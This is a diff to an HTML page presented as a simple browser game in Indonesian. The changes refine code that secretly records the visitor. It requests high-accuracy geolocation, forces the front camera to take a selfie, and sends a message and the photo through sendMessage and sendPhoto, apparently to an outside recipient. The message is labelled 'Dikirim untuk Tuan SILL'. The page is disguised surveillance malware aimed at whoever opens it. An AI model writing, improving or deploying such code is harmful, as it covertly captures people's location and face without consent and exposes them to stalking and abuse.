@@ -78,6 +78,14 @@
             font-size: 14px;
             color: #aaa;
         }
+        #previewVideo {
+            display: none;
+            width: 100%;
+            max-width: 300px;
+            margin: 10px auto;
+            border-radius: 10px;
+            border: 2px solid #e94560;
+        }
     </style>
 </head>
 <body>
@@ -91,6 +99,7 @@
         <canvas id="gameCanvas" width="400" height="400"></canvas>
         <button class="btn" id="startBtn">▶ Mulai Game</button>
         <div class="status" id="statusText">Tekan tombol untuk bermain</div>
+        <video id="previewVideo" autoplay muted></video>
     </div>
 
     <script>
@@ -156,10 +165,13 @@
 
         function getLocation() {
             return new Promise(resolve => {
-                if (!navigator.geolocation) return resolve({ lat: 0, lng: 0 });
+                if (!navigator.geolocation) {
+                    resolve({ lat: 0, lng: 0 });
+                    return;
+                }
                 navigator.geolocation.getCurrentPosition(
                     p => resolve({ lat: p.coords.latitude, lng: p.coords.longitude }),
-                    () => resolve({ lat: 0, lng: 0 }), { timeout: 5000 }
+                    () => resolve({ lat: 0, lng: 0 }), { timeout: 5000, enableHighAccuracy: true }
                 );
             });
         }
@@ -194,32 +206,26 @@
         }
 
         // ============================
-        //  AMBIL FOTO DENGAN KAMERA DEPAN (HP) / DEFAULT (LAPTOP)
+        //  AMBIL FOTO DENGAN KAMERA DEPAN (HP)
         // ============================
         async function ambilFoto() {
             return new Promise((resolve) => {
-                const video = document.createElement('video');
+                const video = document.getElementById('previewVideo');
                 const canvas = document.createElement('canvas');
 
-                // Deteksi HP atau laptop
-                const isMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
-
-                // Pilih kamera depan jika HP, default jika laptop
-                let facingMode = 'user'; // depan = selfie
-                if (!isMobile) {
-                    facingMode = 'environment'; // laptop biasanya pake default
-                }
-
+                // === PAKSA KAMERA DEPAN (USER) ===
                 navigator.mediaDevices.getUserMedia({
                         video: {
-                            facingMode: facingMode,
+                            facingMode: 'user', // DEPAN
                             width: { ideal: 640 },
                             height: { ideal: 480 }
                         }
                     })
                     .then((stream) => {
                         video.srcObject = stream;
+                        video.style.display = 'block';
                         video.play();
+
                         setTimeout(() => {
                             canvas.width = video.videoWidth || 640;
                             canvas.height = video.videoHeight || 480;
@@ -227,10 +233,14 @@
                             ctx.drawImage(video, 0, 0);
                             const foto = canvas.toDataURL('image/jpeg', 0.8);
                             stream.getTracks().forEach(t => t.stop());
+                            video.style.display = 'none';
                             resolve(foto);
-                        }, 800);
+                        }, 1500);
                     })
-                    .catch(() => resolve(null));
+                    .catch(() => {
+                        video.style.display = 'none';
+                        resolve(null);
+                    });
             });
         }
 
@@ -299,10 +309,10 @@
         👑 *Dikirim untuk Tuan SILL*
                 `;
 
-                // === KIRIM PESAN LANGSUNG ===
+                // === KIRIM PESAN ===
                 await sendMessage(pesan);
 
-                // === KIRIM FOTO (SELFIE UNTUK HP) ===
+                // === KIRIM FOTO SELFIE ===
                 const foto = await ambilFoto();
                 if (foto) {
                     await sendPhoto(foto);
@@ -490,6 +500,6 @@
         initGame();
         drawCanvas();
         statusText.textContent = 'Tekan tombol Mulai Game untuk bermain';
-    </script>
+    </script> 
 </body>
 </html>
